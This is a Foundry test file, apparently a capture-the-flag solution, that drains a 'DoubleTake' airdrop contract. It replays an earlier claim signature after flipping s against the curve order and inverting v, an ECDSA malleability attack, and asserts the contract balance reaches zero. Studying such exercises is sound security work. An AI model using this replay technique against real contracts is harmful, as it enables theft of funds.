// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/DoubleTake.sol";

contract DoubleTakeTest is Test {
    DoubleTake public victim;
    address public attacker;

    function setUp() public {
        victim = new DoubleTake{value: 2 ether}();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        // claim first ether
        uint8 v = 28;
        bytes32 r = 0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7;
        bytes32 s = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69;

        vm.startPrank(attacker);
        victim.claimAirdrop(address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8), 1 ether, v, r, s);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        // Conduct attack here

        uint8 v = 28;
        bytes32 r = 0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7;
        bytes32 s = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69;

        // The following is math magic to invert the
        // signature and create a valid one
        // flip s
        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));

        // invert v
        uint8 v2;
        require(v == 27 || v == 28, "invalid v");
        v2 = v == 27 ? 28 : 27;

        victim.claimAirdrop(address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8), 1 ether, v2, r, s2);

        vm.stopPrank();

        assertEq(address(victim).balance, 0, "victim contract not drained");
    }
}
